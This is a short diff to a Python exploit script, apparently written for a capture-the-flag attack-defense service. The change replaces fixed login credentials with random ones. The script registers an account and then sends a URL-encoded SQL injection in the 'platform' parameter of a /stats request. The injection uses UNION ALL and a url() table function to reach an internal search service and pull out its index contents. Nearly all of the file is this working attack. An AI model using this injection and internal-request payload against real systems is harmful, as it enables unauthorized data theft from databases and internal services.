@@ -1,4 +1,5 @@
 import requests
+import secrets
 import sys
 
 IP = sys.argv[1]
@@ -8,7 +9,8 @@ IP = sys.argv[1]
 # print(r.text)
 s = requests.Session()
 
-r = s.post(f'http://{IP}:3355/register', data={'username': 'zxc', 'password': 'zxd'})
+log, password = secrets.token_hex(12), secrets.token_hex(12)
+r = s.post(f'http://{IP}:3355/register', data={'username': log, 'password': password})
 print(r.text)
 
 r = s.get(f'http://{IP}:3355/stats?platform=mac&platform=web%27%20GROUP%20by%20query%20UNION%20ALL%20SELECT%20100%20as%20cnt,query%20FROM%20url("http://melisearch:7700/indexes/index_1/search?q=",%20"JSONAsString",%20%27query%20String%27)%20WHERE%20%271%27=%271')
